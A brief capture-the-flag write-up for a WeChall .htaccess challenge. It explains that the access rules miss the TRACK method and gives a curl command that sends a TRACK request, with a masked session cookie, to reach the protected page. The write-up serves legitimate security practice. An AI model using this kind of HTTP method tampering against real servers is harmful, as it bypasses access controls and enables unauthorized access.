# [Limited Access Too](https://www.wechall.net/challenge/wannabe7331/limited_access_too/index.php)

This is another `.htaccess` challenge. The configuration has been updated to restrict almost every 
single request type. But there is something similar to `TRACE` that's not accounted for... `TRACK`

`curl 'https://www.wechall.net/challenge/wannabe7331/limited_access_too/protected/protected.php' -X TRACK -H 'Cookie: WC=11XXXXXX-XXXXX-XXXXXXXXXXXXXXXX'`

Solved.
